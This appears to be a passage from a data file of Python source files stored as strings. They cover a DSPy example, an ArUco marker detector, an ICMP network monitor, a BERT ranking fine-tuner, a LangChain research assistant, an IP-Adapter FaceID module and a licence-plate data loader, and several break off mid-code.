socket.timeout) as e:\n                logging.error(str(e))\n                raise e\n            except Exception as e:\n                # \u6355\u6349\u672a\u9884\u6599\u7684\u5f02\u5e38\uff0c\u8003\u8651\u662f\u5426\u7ec8\u6b62\u5faa\u73af\u6216\u505a\u5176\u4ed6\u5904\u7406\n                logging.error(f\"An unexpected error occurred: {str(e)}\")\n                raise e\n            time.sleep(sleep_time)\n\nif __name__ == '__main__':\n    # https://platform.openai.com/docs/api-reference\n    args = read_args()\n    chat_gpt = ChatGLMLLM(args.config_path)\n    chat_gpt.interactive_dialogue()",
    "# DSPy Example\n# 21 Apr 2024 _ 8AM\n# Author: Mr.Jack _ www.BICweb.vn\n\n# install DSPy: pip install dspy\nimport dspy\n\nollama_model = dspy.OpenAI(api_base='http://localhost:11434/v1/', api_key='ollama', model='mistral', stop='\\n\\n', model_type='chat', max_tokens=256)\n# ollama_model = dspy.OllamaLocal(model='mistral')\n\n# This sets the language model for DSPy.\ndspy.settings.configure(lm=ollama_model)\n\nmy_example = [{\n    \"question\": \"Who are you?\", \n    \"context\": \"I am your assistant.\"}, \n    {\"question\": \"What's your name?\", \n    \"context\": \"My name is Auto-Agent.\"},\n    {\"question\": \"What do you do?\", \n    \"context\": \"My mission is: to be a best friend with you.\"},\n    ]\n\n# This is the signature for the predictor. It is a simple question and answer model.\nclass BasicQA(dspy.Signature):\n    \"\"\"Answer questions with the context you must following.\"\"\"\n\n    question = dspy.InputField()\n    context = dspy.InputField()\n    answer = dspy.OutputField(desc=\"often between 1 and 5 words\")\n\n# Define the predictor.\ngenerate_answer = dspy.Predict(BasicQA)\n\nfor exam in my_example:\n    pred = generate_answer(question=exam['question'], context=exam['context'])\n\n    print(\"\\nquestion:\", exam['question'])\n    print(\"answer:\", pred.answer)\n\n# ollama_model.inspect_history(n=1)\n\n\"\"\"\nquestion: Who are you?\nanswer: Your assistant.\n\nquestion: What's your name?\nanswer: I'm Auto-Agent.\n\nquestion: What do you do?\nanswer: Be your best friend.\n\n\"\"\"\n",
    "import cv2\nimport numpy as np\nimport argparse\n \n# Project: ArUco Marker Detector\n# Reference: https://www.pyimagesearch.com/2020/12/21/detecting-aruco-markers-with-opencv-and-python/\n \ndesired_aruco_dictionary = \"DICT_ARUCO_ORIGINAL\"\n \n# The different ArUco dictionaries built into the OpenCV library. \nARUCO_DICT = {\n  \"DICT_4X4_50\": cv2.aruco.DICT_4X4_50,\n  \"DICT_4X4_100\": cv2.aruco.DICT_4X4_100,\n  \"DICT_4X4_250\": cv2.aruco.DICT_4X4_250,\n  \"DICT_4X4_1000\": cv2.aruco.DICT_4X4_1000,\n  \"DICT_5X5_50\": cv2.aruco.DICT_5X5_50,\n  \"DICT_5X5_100\": cv2.aruco.DICT_5X5_100,\n  \"DICT_5X5_250\": cv2.aruco.DICT_5X5_250,\n  \"DICT_5X5_1000\": cv2.aruco.DICT_5X5_1000,\n  \"DICT_6X6_50\": cv2.aruco.DICT_6X6_50,\n  \"DICT_6X6_100\": cv2.aruco.DICT_6X6_100,\n  \"DICT_6X6_250\": cv2.aruco.DICT_6X6_250,\n  \"DICT_6X6_1000\": cv2.aruco.DICT_6X6_1000,\n  \"DICT_7X7_50\": cv2.aruco.DICT_7X7_50,\n  \"DICT_7X7_100\": cv2.aruco.DICT_7X7_100,\n  \"DICT_7X7_250\": cv2.aruco.DICT_7X7_250,\n  \"DICT_7X7_1000\": cv2.aruco.DICT_7X7_1000,\n  \"DICT_ARUCO_ORIGINAL\": cv2.aruco.DICT_ARUCO_ORIGINAL\n}\n\nif __name__ == '__main__':\n\n  parser = argparse.ArgumentParser(description='Detect ArUco Marker')\n\n  ### Positional arguments\n  parser.add_argument('-p', '--pokemon_flag', default=False, help=\"Flag to draw traditional location of ArUco Markers or pokemons\")\n\n  args = vars(parser.parse_args())\n\n  pokemon_flag  = (args[\"pokemon_flag\"])\n\n  # Check if ArUco marker exist.\n  if ARUCO_DICT.get(desired_aruco_dictionary, None) is None:\n    print(\"[INFO] ArUCo tag of '{}' is not supported\".format(\n      args[\"type\"]))\n    sys.exit(0)\n     \n  # Load the ArUco dictionary\n  print(\"[INFO] detecting '{}' markers...\".format(\n    desired_aruco_dictionary))\n  this_aruco_dictionary = cv2.aruco.Dictionary_get(ARUCO_DICT[desired_aruco_dictionary])\n  this_aruco_parameters = cv2.aruco.DetectorParameters_create()\n   \n  # Start the video stream\n  # 0 is default camera, change value for different input camera\n  cv2.namedWindow(\"frame\", cv2.WINDOW_NORMAL)\n  cap = cv2.VideoCapture(0) \n   \n  while(True):\n  \n    # Get Frame\n    ret, frame = cap.read()\n     \n    # Detect ArUco markers in the video frame\n    (corners, ids, rejected) = cv2.aruco.detectMarkers(\n      frame, this_aruco_dictionary, parameters=this_aruco_parameters)\n       \n    # Check that at least one ArUco marker was detected\n    if len(corners) > 0:\n      # Flatten the ArUco IDs list\n      ids = ids.flatten()\n       \n      # Loop over the detected ArUco corners\n      for (marker_corner, marker_id) in zip(corners, ids):\n       \n        # Extract the marker corners\n        corners = marker_corner.reshape((4, 2))\n        (top_left, top_right, bottom_right, bottom_left) = corners\n         \n        # Convert the (x,y) coordinate pairs to integers\n        top_right = (int(top_right[0]), int(top_right[1]))\n        bottom_right = (int(bottom_right[0]), int(bottom_right[1]))\n        bottom_left = (int(bottom_left[0]), int(bottom_left[1]))\n        top_left = (int(top_left[0]), int(top_left[1]))      \n         \n        # Calculate the center of the ArUco marker\n        center_x = int((top_left[0] + bottom_right[0]) / 2.0)\n        center_y = int((top_left[1] + bottom_right[1]) / 2.0)\n        \n        # Draw pokemons over frame, else just draw bounding box for ArUco Markers\n        if pokemon_flag:          \n          width = abs(top_left[0] - bottom_right[0])\n          height = abs(top_left[1] - bottom_right[1])\n          dim = (width, height)\n\n          try:\n              bH, bW = frame.shape[:2]\n              empty = 0 * np.ones((bH, bW, 3), dtype=np.uint8)\n              # This drawing only consider one orientation of the marker\n              if marker_id == 5:\n                overlay_charmander = cv2.imread('data/charmander.png')\n                overlay_charmander = cv2.resize(overlay_charmander, dim, interpolation = cv2.INTER_AREA)\n\n                empty[:height, :width] = overlay_charmander\n                _inp = np.float32([[0, 0], [width, 0], [width, height], [0, height]])\n                _out = np.float32([top_left, top_right, bottom_right, bottom_left])\n                M = cv2.getPerspectiveTransform(_inp, _out)\n                transformed = cv2.warpPerspective(empty, M, (bW, bH))\n                frame[np.where(transformed != 0)] = transformed[np.where(transformed != 0)]\n\n              elif marker_id == 1:\n                overlay_bulbasaur = cv2.imread('data/bulbasaur.png')\n                overlay_bulbasaur = cv2.resize(overlay_bulbasaur, dim, interpolation = cv2.INTER_AREA)\n\n                empty[:height, :width] = overlay_bulbasaur\n                _inp = np.float32([[0, 0], [width, 0], [width, height], [0, height]])\n                _out = np.float32([top_left, top_right, bottom_right, bottom_left])\n                M = cv2.getPerspectiveTransform(_inp, _out)\n                transformed = cv2.warpPerspective(empty, M, (bW, bH))\n                frame[np.where(transformed != 0)] = transformed[np.where(transformed != 0)]\n\n              elif marker_id ",
    "import logging\r\nfrom collections import defaultdict\r\nfrom datetime import datetime\r\nimport tkinter as tk\r\nfrom tkinter import messagebox, simpledialog, ttk\r\nfrom PIL import Image, ImageTk\r\nfrom scapy.all import sniff, ICMP, IP\r\nfrom threading import Thread\r\nimport matplotlib.pyplot as plt\r\nfrom matplotlib.backends.backend_tkagg import FigureCanvasTkAgg\r\nfrom matplotlib.animation import FuncAnimation\r\nfrom matplotlib import style as mplstyle\r\nimport requests\r\nimport subprocess\r\nimport platform\r\n\r\nlogging.basicConfig(level=logging.INFO, format='%(asctime)s: %(message)s')\r\n\r\nmplstyle.use('dark_background')\r\n\r\nclass WickShieldGUI:\r\n    def __init__(self, master):\r\n        self.master = master\r\n        master.title(\"Wick Shield - Advanced Network Monitor with IP Blocking\")\r\n        self.master.geometry(\"1280x720\")\r\n        self.master.protocol(\"WM_DELETE_WINDOW\", self.on_closing)\r\n        self.is_closing = False\r\n\r\n        self.ip_activity = defaultdict(lambda: defaultdict(int))\r\n        self.suspicious_ip_counts = defaultdict(int)\r\n        self.block_threshold = 10\r\n\r\n        self.style = ttk.Style(self.master)\r\n        self.style.theme_use('clam') \r\n        self.configure_styles()\r\n\r\n        self.setup_ui()\r\n\r\n        self.sniff_thread = Thread(target=self.sniff_network, daemon=True)\r\n        self.sniff_thread.start()\r\n\r\n    def configure_styles(self):\r\n        background_color = '#181B28'\r\n        foreground_color = '#ffffff'\r\n        button_color = '#5c5c5c'\r\n        tab_color = '#444444'\r\n\r\n        self.style.configure('TFrame', background=background_color)\r\n        self.style.configure('TButton', background=button_color, foreground=foreground_color, font=('Helvetica', 10), borderwidth=1)\r\n        self.style.map('TButton', background=[('active', tab_color)], foreground=[('active', foreground_color)])\r\n        self.style.configure('TLabel', background=background_color, foreground=foreground_color, font=('Helvetica', 10))\r\n        self.style.configure('TNotebook', background=background_color, borderwidth=0)\r\n        self.style.configure('TNotebook.Tab', background=tab_color, foreground=foreground_color, padding=[5, 2], font=('Helvetica', 10, 'bold'))\r\n        self.style.map('TNotebook.Tab', background=[('selected', button_color)], foreground=[('selected', foreground_color)])\r\n        self.style.configure('TEntry', background=button_color, foreground=foreground_color, highlightthickness=0)\r\n\r\n    def setup_ui(self):\r\n        self.load_logo()\r\n\r\n        self.notebook = ttk.Notebook(self.master)\r\n        self.notebook.pack(expand=True, fill='both')\r\n\r\n        self.setup_traffic_tab()\r\n        self.setup_logs_tab()\r\n\r\n        self.fetch_ip_btn = ttk.Button(self.master, text=\"Fetch IP Details\", command=self.fetch_ip_details_dialog)\r\n        self.fetch_ip_btn.pack(side=tk.BOTTOM, pady=20)\r\n\r\n    def load_logo(self):\r\n        try:\r\n            logo_image = Image.open(\"wick_shield_logo.png\")\r\n            logo_image = logo_image.resize((200, 200), Image.Resampling.LANCZOS)\r\n            self.logo_photo = ImageTk.PhotoImage(logo_image)\r\n            logo_label = tk.Label(self.master, image=self.logo_photo, bg='#181B28')\r\n            logo_label.pack(side=tk.TOP, pady=10)\r\n        except Exception as e:\r\n            logging.error(f\"Error loading logo: {e}\")\r\n\r\n\r\n    def setup_traffic_tab(self):\r\n        self.traffic_tab = ttk.Frame(self.notebook)\r\n        self.notebook.add(self.traffic_tab, text=\"Network Traffic\")\r\n\r\n        self.fig, self.ax = plt.subplots(figsize=(6, 4), tight_layout=True)\r\n        self.canvas = FigureCanvasTkAgg(self.fig, master=self.traffic_tab)\r\n        self.canvas_widget = self.canvas.get_tk_widget()\r\n        self.canvas_widget.pack(side=tk.TOP, fill=tk.BOTH, expand=True)\r\n\r\n        self.ani = FuncAnimation(self.fig, self.update_graph, interval=1000, cache_frame_data=False)\r\n\r\n    def setup_logs_tab(self):\r\n        self.logs_tab = ttk.Frame(self.notebook)\r\n        self.notebook.add(self.logs_tab, text=\"Logs\")\r\n\r\n        self.log_text = tk.Text(self.logs_tab, state='disabled', wrap='word', background='gray12', foreground='white')\r\n        self.log_text.pack(expand=True, fill='both')\r\n\r\n        log_scrollbar = ttk.Scrollbar(self.logs_tab, command=self.log_text.yview, orient='vertical')\r\n        log_scrollbar.pack(side='right', fill='y')\r\n        self.log_text['yscrollcommand'] = log_scrollbar.set\r\n\r\n    def sniff_network(self):\r\n        sniff(prn=self.process_packet, filter=\"icmp\", store=0)\r\n\r\n    def process_packet(self, packet):\r\n        if packet.haslayer(ICMP):\r\n            src_ip = packet[IP].src\r\n            self.suspicious_ip_counts[src_ip] += 1\r\n            if self.suspicious_ip_counts[src_ip] >= self.block_threshold:\r\n                self.block_ip(src_ip)\r\n            self.ip_activity[src_ip][datetime.now().minute] += 1\r\n            self.log(f\"ICMP Packet: {src_ip}\")\r\n\r\n    def update_graph(self, frame):\r\n        if self.is_closing:\r\n            return\r\n        ips = list(self.ip_activity.keys",
    "import pathlib\nfrom setuptools import find_packages, setup\n\nwith open('requirements.txt',\"r\",encoding=\"utf-8\") as f:\n    required = f.read().splitlines()\n\nsetup(\n    name=\"PyTorchModelHubMixin_template\",\n    version=\"0.0.1\",\n    description=\"a template for the PyTorchModelHubMixin\",\n    long_description=pathlib.Path(\"README.md\").read_text(encoding=\"utf-8\"),\n    long_description_content_type=\"text/markdown\",\n    Homepage=\"https://github.com/not-lain/PyTorchModelHubMixin-template\",\n    url=\"https://github.com/not-lain/PyTorchModelHubMixin-template\",\n    Issues=\"https://github.com/not-lain/PyTorchModelHubMixin-template/issues\",\n    authors=[{\"name\": \"hafedh hichri\", \"email\": \"hhichri60@gmail.com\"}],\n    license=\"Apache 2.0 License\",\n    package_dir={\"\": \"src\"},\n    packages=find_packages(\"src\"),\n    include_package_data=True,\n    classifiers=[\"Topic :: Utilities\", \"Programming Language :: Python :: 3.9\"],\n    use_scm_version=True,\n    setup_requires=['setuptools_scm'],\n    install_requires=required,\n)\n",
    "import argparse\nfrom pathlib import Path\nfrom functools import partial\nimport json\nimport math\nimport itertools\n\nimport numpy as np\nfrom matplotlib import pyplot as plt\n\nimport torch\nfrom torch import nn\nfrom torch.utils.data import DataLoader, Dataset\nimport torch.nn.functional as F\n\nimport pytorch_lightning as pl\nfrom pytorch_lightning.loggers import TensorBoardLogger\nfrom pytorch_lightning.callbacks import LearningRateMonitor, ModelCheckpoint\nfrom pytorch_lightning.utilities.seed import seed_everything\n\nfrom transformers import BertTokenizer, BertModel, AdamW, get_linear_schedule_with_warmup\n\nimport transformers\ntransformers.logging.set_verbosity_error()\n\nseed_everything(42)\n\nMODEL = 'bert-base-uncased'\ntokenizer = BertTokenizer.from_pretrained(MODEL)\n\nclass RankingDataset(Dataset):\n\n    def __init__(self, file_dir):\n        self.examples = []\n        with open(file_dir, 'r') as f:\n            for line in f:\n                self.examples.append(json.loads(line))\n\n        for i in range(len(self.examples)-1, -1, -1):\n            if self.examples[i]['majority_vote'] == '?':\n                del self.examples[i]\n\n        print('loaded {} examples from {}'.format(len(self.examples), file_dir))\n\n    def __len__(self):\n        return len(self.examples)\n\n    def __getitem__(self, idx):\n        x = self.examples[idx]\n        return (x['responseA']['response'], x['responseB']['response']) , int(x['majority_vote'] == 'A')\n\n\n\ndef ranking_collate(samples, max_len=500):\n\n    response_A = []\n    response_B = []\n    response_AB = []\n    response_BA = []\n    labels = []\n\n    for example, label in samples:\n        response_A.append(example[0])\n        response_B.append(example[1])\n        response_AB.append(example[0] + ' [SEP] ' + example[1])\n        response_BA.append(example[1] + ' [SEP] ' + example[0])\n        labels.append(label)\n    \n    # tokenize and print length\n    # inputs = tokenizer(response_AB)\n    # print([len(x) for x in inputs['input_ids']])\n    # print('max length: {}'.format(max([len(x) for x in inputs['input_ids']])))\n\n    response_A = tokenizer(response_A, padding=True, truncation=True, max_length=max_len, return_tensors='pt')\n    response_B = tokenizer(response_B, padding=True, truncation=True, max_length=max_len, return_tensors='pt')\n    response_AB = tokenizer(response_AB, padding=True, truncation=True, max_length=max_len, return_tensors='pt')\n    response_BA = tokenizer(response_BA, padding=True, truncation=True, max_length=max_len, return_tensors='pt')\n\n    return {\n        'response_A': response_A,\n        'response_B': response_B,\n        'response_AB': response_AB,\n        'response_BA': response_BA,\n        'labels': torch.tensor(labels)\n    }\n\n\n\nclass Finetuner(pl.LightningModule):\n    def __init__(self, hparams):\n        super().__init__()\n        self.save_hyperparameters(hparams)\n        self.bert = BertModel.from_pretrained(MODEL)\n        self.classifier = nn.Linear(self.bert.config.hidden_size, 2)\n        self.dropout = nn.Dropout(hparams['dropout'])\n\n    def forward(self, batch):\n        batch_size = batch['response_A']['input_ids'].shape[0]\n\n        # get embeddings from BERT\n        outputs_AB = self.bert(output_attentions=False,\n                        output_hidden_states=False,\n                        **batch['response_AB'],\n                        )\n        outputs_BA = self.bert(output_attentions=False,\n                        output_hidden_states=False,\n                        **batch['response_BA'],\n                        )\n        scores = self.classifier(self.dropout(outputs_AB.last_hidden_state[:, 0])) - self.classifier(self.dropout(outputs_BA.last_hidden_state[:, 0]))\n\n        # compute loss\n        loss = F.cross_entropy(scores, batch['labels'])\n        # check nan\n        if torch.isnan(loss).any():\n            loss = torch.tensor(0.0).to(loss.device)\n\n        return {\n            'scores': scores,\n            'loss': loss\n        }\n\n\n    def training_step(self, batch, batch_idx):\n        output = self(batch)\n        loss = output['loss']\n        self.log('train_loss', loss, on_step=True, on_epoch=True, prog_bar=True)\n        return {'loss': loss}\n\n    def validation_step(self, batch, batch_idx):\n        output = self(batch)\n        return {\n            'val_loss': output['loss'],\n            'scores': output['scores'],\n            'labels': batch['labels'],\n        }\n    \n    def predict_step(self, batch, batch_idx, dataloader_idx=0):\n        return self.validation_step(batch, batch_idx)\n\n    def validation_epoch_end(self, outputs):\n        loss = torch.stack([x['val_loss'] for x in outputs]).mean()\n        scores = torch.cat([x['scores'] for x in outputs])\n\n        if self.global_rank == 0:\n            tensorboard = self.logger.experiment\n        \n        acc = (scores.argmax(dim=1) == torch.cat([x['labels'] for x in outputs])).float().mean()\n        # print('predictions')\n        # print(scores.argmax(dim=1))\n        # print('labels')\n        # print(torch.cat([x['la",
    "from langchain.chat_models import ChatOpenAI\nfrom langchain.prompts import ChatPromptTemplate\nimport requests\nfrom langchain.schema.output_parser import StrOutputParser\nfrom bs4 import BeautifulSoup\nfrom dotenv import load_dotenv\nimport os\nfrom langchain.schema.runnable import RunnablePassthrough,RunnableLambda\nfrom langchain.utilities import DuckDuckGoSearchAPIWrapper\nfrom langchain_google_genai import ChatGoogleGenerativeAI\nfrom fastapi import FastAPI\nfrom langserve import add_routes\nimport json\n\nload_dotenv()\nos.environ[\"LANGCHAIN_TRACING_V2\"]=\"true\"\nos.environ[\"LANGCHAIN_API_KEY\"]=os.getenv(\"LANGCHAIN_API_KEY\")\n\nRESULTS_PER_QUESTION=3\n\nddg_search=DuckDuckGoSearchAPIWrapper()\n\ndef web_search(query:str,num_results:int=RESULTS_PER_QUESTION):\n    results=ddg_search.results(query,num_results)\n    return [r[\"link\"] for r in results]\n\n\n\nSUMMARY_TEMPLATE=\"\"\"{text}\n--------------------\n\nUsing the above text, answer in short the following question:\n>{question}\n--------------------\n\"\"\"\n\n\n\n\ntemplate=\"\"\"\n{text}\nUsing the above text, answer the following question:\n>{question}\nIf the question cannot be answered by the text ,simply summarize the text.Include all factual information,numbers,stats etc.\n\"\"\"\n\n\n\nSearch_prompt=ChatPromptTemplate.from_messages(\n    [\n        (\n            \"user\",\n            \"Write 3 google search queries to searh online that form an\"\n            \"objective opinion from the following :{question}\\n\"\n            \"You must respond with a list of strings in the following format:\"\n            '[\"query1\",\"query2\",\"query3\"]',\n        ),\n    ]\n)\n\n\nSummary_prompt=ChatPromptTemplate.from_template(\n    template=SUMMARY_TEMPLATE\n)\nprompt=ChatPromptTemplate.from_template(\n    template=template,\n    \n)\nurl=\"https://blog.langchain.dev/announcing-langsmith/\"\n\ndef scrape_text(website:str):\n    try:\n        response=requests.get(website)\n\n        if response.status_code==200:\n            soup=BeautifulSoup(response.text,'html.parser')\n\n            page_text=soup.get_text(separator=\"\",strip=True)\n\n            return page_text\n        else:\n            return f\"Failed with status:{response.status_code}\"\n    except Exception as e:\n        print(e)\n        return \"Failed with exception:{e}\"\n\n\n\nsearch_question_chain=Search_prompt|ChatGoogleGenerativeAI(model=\"gemini-pro\")|StrOutputParser()|json.loads\n\n# search_question_chain.invoke(\n#     {\n#         \"question\":\"What is difference between langsmith and langchain?\",\n#     }\n# )\n\nscrape_and_summarize_chain = RunnablePassthrough.assign(\n    summary = RunnablePassthrough.assign(\n    text=lambda x: scrape_text(x[\"url\"])[:10000]\n) | Summary_prompt | ChatGoogleGenerativeAI(model=\"gemini-pro\") | StrOutputParser()\n) | (lambda x: f\"URL: {x['url']}\\n\\nSUMMARY: {x['summary']}\")\n\n\nweb_search_chain=RunnablePassthrough.assign(\n    urls=lambda x :web_search(x[\"question\"])\n    )| (lambda x:[{\"question\":x[\"question\"],\"url\":u} for u in x[\"urls\"]]) | scrape_and_summarize_chain.map()\n\nfull_research_chain=search_question_chain|( lambda x:[{\"question\":q} for q in x])|web_search_chain.map()\n\n\nWRITER_SYSTEM_PROMPT = \"You are an AI critical thinker research assistant. Your sole purpose is to write well written, critically acclaimed, objective and structured reports on given text.\"  # noqa: E501\n\nRESEARCH_REPORT_TEMPLATE = \"\"\"Information:\n--------\n{research_summary}\n--------\nUsing the above information, answer the following question or topic: \"{question}\" in a detailed report -- \\\nThe report should focus on the answer to the question, should be well structured, informative, \\\nin depth, with facts and numbers if available and a minimum of 1,200 words.\nYou should strive to write the report as long as you can using all relevant and necessary information provided.\nYou must write the report with markdown syntax.\nYou MUST determine your own concrete and valid opinion based on the given information. Do NOT deter to general and meaningless conclusions.\nWrite all used source urls at the end of the report, and make sure to not add duplicated sources, but only one reference for each.\nYou must write the report in apa format.\nPlease do your best, this is very important to my career.\"\"\"  \n\nprompt = ChatPromptTemplate.from_messages(\n    [\n        (\"system\", WRITER_SYSTEM_PROMPT),\n        (\"user\", RESEARCH_REPORT_TEMPLATE),\n    ]\n)\n\n\ndef collapse_list_of_lists(list_of_lists):\n    content=[]\n    for l in list_of_lists:\n        content.append(\"\\n\\n\".join(l))\n    return \"\\n\\n\".join(content)\n\nchain=RunnablePassthrough.assign(\n    research_summary=full_research_chain|collapse_list_of_lists\n)|prompt|ChatGoogleGenerativeAI(model=\"gemini-pro\",convert_system_message_to_human=True)|StrOutputParser()\n\n\n\n\n\napp = FastAPI(\n    title=\"LangChain Server\",\n    version=\"1.0\",\n    description=\"A simple api server using Langchain's Runnable interfaces\",\n)\n\nadd_routes(\n    app,\n    chain,\n    path=\"/research-assistant\",\n)\n\n\nif __name__ == \"__main__\":\n    import uvicorn\n\n    uvicorn.run(app, host=\"localhost\", port=8000)\n\n\n\n\n\n",
    "\nimport os\nimport pdb\nfrom typing import List\n\nimport numpy as np\nimport torch\nfrom safetensors import safe_open\nfrom transformers import CLIPImageProcessor, CLIPVisionModelWithProjection\nfrom garment_seg.process import load_seg_model, generate_mask\n\nfrom utils.utils import is_torch2_available, prepare_image, prepare_mask\nimport copy\nfrom utils.resampler import PerceiverAttention, FeedForward\nfrom insightface.utils import face_align\nfrom insightface.app import FaceAnalysis\nimport cv2\n\nUSE_DAFAULT_ATTN = False  # should be True for visualization_attnmap\nif is_torch2_available() and (not USE_DAFAULT_ATTN):\n    from .attention_processor import AttnProcessor2_0 as AttnProcessor\n    from .attention_processor import IPAttnProcessor2_0 as IPAttnProcessor\n    from .attention_processor import REFAttnProcessor2_0 as REFAttnProcessor\nelse:\n    from .attention_processor import AttnProcessor, IPAttnProcessor, REFAttnProcessor\n\n\nclass FacePerceiverResampler(torch.nn.Module):\n    def __init__(\n            self,\n            *,\n            dim=768,\n            depth=4,\n            dim_head=64,\n            heads=16,\n            embedding_dim=1280,\n            output_dim=768,\n            ff_mult=4,\n    ):\n        super().__init__()\n\n        self.proj_in = torch.nn.Linear(embedding_dim, dim)\n        self.proj_out = torch.nn.Linear(dim, output_dim)\n        self.norm_out = torch.nn.LayerNorm(output_dim)\n        self.layers = torch.nn.ModuleList([])\n        for _ in range(depth):\n            self.layers.append(\n                torch.nn.ModuleList(\n                    [\n                        PerceiverAttention(dim=dim, dim_head=dim_head, heads=heads),\n                        FeedForward(dim=dim, mult=ff_mult),\n                    ]\n                )\n            )\n\n    def forward(self, latents, x):\n        x = self.proj_in(x)\n        for attn, ff in self.layers:\n            latents = attn(x, latents) + latents\n            latents = ff(latents) + latents\n        latents = self.proj_out(latents)\n        return self.norm_out(latents)\n\n\nclass MLPProjModel(torch.nn.Module):\n    def __init__(self, cross_attention_dim=768, id_embeddings_dim=512, num_tokens=4):\n        super().__init__()\n\n        self.cross_attention_dim = cross_attention_dim\n        self.num_tokens = num_tokens\n\n        self.proj = torch.nn.Sequential(\n            torch.nn.Linear(id_embeddings_dim, id_embeddings_dim * 2),\n            torch.nn.GELU(),\n            torch.nn.Linear(id_embeddings_dim * 2, cross_attention_dim * num_tokens),\n        )\n        self.norm = torch.nn.LayerNorm(cross_attention_dim)\n\n    def forward(self, id_embeds):\n        x = self.proj(id_embeds)\n        x = x.reshape(-1, self.num_tokens, self.cross_attention_dim)\n        x = self.norm(x)\n        return x\n\n\nclass ProjPlusModel(torch.nn.Module):\n    def __init__(self, cross_attention_dim=768, id_embeddings_dim=512, clip_embeddings_dim=1280, num_tokens=4):\n        super().__init__()\n\n        self.cross_attention_dim = cross_attention_dim\n        self.num_tokens = num_tokens\n\n        self.proj = torch.nn.Sequential(\n            torch.nn.Linear(id_embeddings_dim, id_embeddings_dim * 2),\n            torch.nn.GELU(),\n            torch.nn.Linear(id_embeddings_dim * 2, cross_attention_dim * num_tokens),\n        )\n        self.norm = torch.nn.LayerNorm(cross_attention_dim)\n\n        self.perceiver_resampler = FacePerceiverResampler(\n            dim=cross_attention_dim,\n            depth=4,\n            dim_head=64,\n            heads=cross_attention_dim // 64,\n            embedding_dim=clip_embeddings_dim,\n            output_dim=cross_attention_dim,\n            ff_mult=4,\n        )\n\n    def forward(self, id_embeds, clip_embeds, shortcut=False, scale=1.0):\n        x = self.proj(id_embeds)\n        x = x.reshape(-1, self.num_tokens, self.cross_attention_dim)\n        x = self.norm(x)\n        out = self.perceiver_resampler(x, clip_embeds)\n        if shortcut:\n            out = x + scale * out\n        return out\n\n\nclass IPAdapterFaceID:\n    def __init__(self, sd_pipe, ref_path, ip_ckpt, device, enable_cloth_guidance, num_tokens=4, n_cond=1, torch_dtype=torch.float16, set_seg_model=True):\n        self.enable_cloth_guidance = enable_cloth_guidance\n        self.device = device\n        self.ip_ckpt = ip_ckpt\n        self.num_tokens = num_tokens\n        self.n_cond = n_cond\n        self.torch_dtype = torch_dtype\n\n        self.pipe = sd_pipe.to(self.device)\n        self.set_ip_adapter()\n\n        # image proj model\n        self.image_proj_model = self.init_proj()\n\n        self.load_ip_adapter()\n\n        self.set_insightface()\n\n        ref_unet = copy.deepcopy(sd_pipe.unet)\n        state_dict = {}\n        with safe_open(ref_path, framework=\"pt\", device=\"cpu\") as f:\n            for key in f.keys():\n                state_dict[key] = f.get_tensor(key)\n        ref_unet.load_state_dict(state_dict, strict=False)\n\n        self.ref_unet = ref_unet.to(self.device)\n        self.set_ref_adapter()\n        if set_seg_model:\n         ",
    "from torch.utils.data import *\nfrom imutils import paths\nimport numpy as np\nimport random\nimport cv2\nimport os\n\nCHARS = ['\u4eac', '\u6caa', '\u6d25', '\u6e1d', '\u5180', '\u664b', '\u8499', '\u8fbd', '\u5409', '\u9ed1',\n         '\u82cf', '\u6d59', '\u7696', '\u95fd', '\u8d63', '\u9c81', '\u8c6b', '\u9102', '\u6e58', '\u7ca4',\n         '\u6842', '\u743c', '\u5ddd', '\u8d35', '\u4e91', '\u85cf', '\u9655', '\u7518', '\u9752', '\u5b81',\n         '\u65b0',\n         '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',\n         'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K',\n         'L', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',\n         'W', 'X', 'Y', 'Z', 'I', 'O', '-'\n         ]\n\nCHARS_DICT = {char:i for i, char in enumerate(CHARS)}\n\nclass LPRDataLoader(Dataset):\n    def __init__(self, img_dir, imgSize, lpr_max_len, PreprocFun=None):\n        self.img_dir = img_dir\n        self.img_paths = []\n        for i in range(len(img_dir)):\n            self.img_paths += [el for el in paths.list_images(img_dir[i])]\n        random.shuffle(self.img_paths)\n        self.img_size = imgSize\n        self.lpr_max_len = lpr_max_len\n        if PreprocFun is not None:\n            self.PreprocFun = PreprocFun\n        else:\n            self.PreprocFun = self.transform\n\n    def __len__(self):\n        return len(self.img_paths)\n\n    def __getitem__(self, index):\n        filename = self.img_paths[index]\n        Image = cv2.imread(filename)\n        height, width, _ = Image.shape\n        if height != self.img_size[1] or width != self.img_size[0]:\n            Image = cv2.resize(Image, self.img_size)\n        Image = self.PreprocFun(Image)\n\n        basename = os.path.basename(filename)\n        imgname, suffix = os.path.splitext(basename)\n        imgname = imgname.split(\"-\")[0].split(\"_\")[0]\n        label = list()\n        for c in imgname:\n            # one_hot_base = np.zeros(len(CHARS))\n            # one_hot_base[CHARS_DICT[c]] = 1\n            label.append(CHARS_DICT[c])\n\n        if len(label) == 8:\n            if self.check(label) == False:\n                print(imgname)\n                assert 0, \"Error label ^~^!!!\"\n\n        return Image, label, len(label)\n\n    def transform(self, img):\n        img = img.astype('float32')\n        img -= 127.5\n        img *= 0.0078125\n        img = np.transpose(img, (2, 0, 1))\n\n        return img\n\n    def check(self, label):\n        if label[2] != CHARS_DICT['D'] and label[2] != CHARS_DICT['F'] \\\n                and label[-1] != CHARS_DICT['D'] and label[-1] != CHARS_DICT['F']:\n            print(\"Error label, Please check!\")\n            return False\n        else:\n            return True\n",
    "import cv2\nimport numpy as np\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport  torchvision.transforms as transforms\nfrom PIL import ImageStat\n\nimport torch\nfrom mmengine.model import constant_init, kaiming_init\nfrom torch.nn import init as init\n\nfrom ops_dcnv3.modules.dcnv3 import DCNv3_pytorch\n#from .dcnv3 import build_deformable_conv3\n\ndef last_zero_init(m):\n    if isinstance(m, nn.Sequential):\n        constant_init(m[-1], val=0)\n    else:\n        constant_init(m, val=0)\n\n\nclass ContextBlock(nn.Module):\n\n    def __init__(self,\n                 inplanes,\n                 ratio,\n                 pooling_type='att',\n                 fusion_types=('channel_add',)):\n        super(ContextBlock, self).__init__()\n        assert pooling_type in ['avg', 'att']\n        assert isinstance(fusion_types, (list, tuple))\n        valid_fusion_types = ['channel_add', 'channel_mul']\n        assert all([f in valid_fusion_types for f in fusion_types])\n        assert len(fusion_types) > 0, 'at least one fusion should be used'\n        self.inplanes 